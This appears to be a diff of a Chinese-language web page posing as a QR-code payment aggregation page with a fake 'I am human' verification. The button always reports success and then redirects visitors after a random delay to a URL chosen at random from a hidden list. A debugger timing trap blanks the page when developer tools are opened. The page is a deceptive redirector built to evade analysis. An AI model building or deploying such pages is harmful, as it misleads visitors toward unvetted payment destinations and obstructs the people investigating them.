@@ -2,10 +2,23 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>正在验证...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>扫码支付 · 聚合码</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 100px; background: #f9f9f9; }
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      background: #f9f9f9;
+    }
+    .card {
+      display: inline-block;
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    h2 { margin-top: 10px; }
     #verifyBtn {
       padding: 12px 24px;
       font-size: 18px;
@@ -14,14 +27,22 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 20px;
     }
-    #status { margin-top: 30px; font-size: 16px; color: #555; }
+    #status {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #555;
+    }
   </style>
 </head>
 <body>
-  <h2>请进行人机验证</h2>
-  <button id="verifyBtn">我是人类</button>
-  <div id="status">正在加载验证码模块...</div>
+  <div class="card">
+    <h2>扫码支付 · 聚合收款</h2>
+    <p>请进行验证以继续</p>
+    <button id="verifyBtn">我是人类</button>
+    <div id="status">等待验证...</div>
+  </div>
 
   <script>
     (function () {
@@ -37,8 +58,8 @@
         debugger;
         const e = new Date();
         if (e - n > t) {
-          document.body.innerHTML = "<h2>检测到非法调试，跳转已终止。</h2>";
-          throw new Error("Debugger detected");
+          document.body.innerHTML = "<h2>检测到调试，终止跳转</h2>";
+          throw new Error("调试被禁止");
         }
       }
 
@@ -46,12 +67,11 @@
       const status = document.getElementById('status');
 
       btn.addEventListener('click', function () {
-        status.innerText = "验证通过，正在跳转...";
         btn.disabled = true;
         btn.innerText = "验证中...";
-        
-        const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3秒延迟
-        setTimeout(function () {
+        status.innerText = "验证成功，正在跳转...";
+
+        setTimeout(() => {
           try {
             antiDebug();
             const target = urls[Math.floor(Math.random() * urls.length)];
@@ -59,14 +79,8 @@
           } catch (e) {
             console.warn(e);
           }
-        }, delay);
+        }, Math.random() * 2000 + 1000); // 1~3秒随机延迟
       });
-
-      if (!document.hasFocus()) {
-        status.innerText = "请点击页面以继续...";
-        window.addEventListener("focus", () => location.reload());
-        btn.disabled = true;
-      }
     })();
   </script>
 </body>
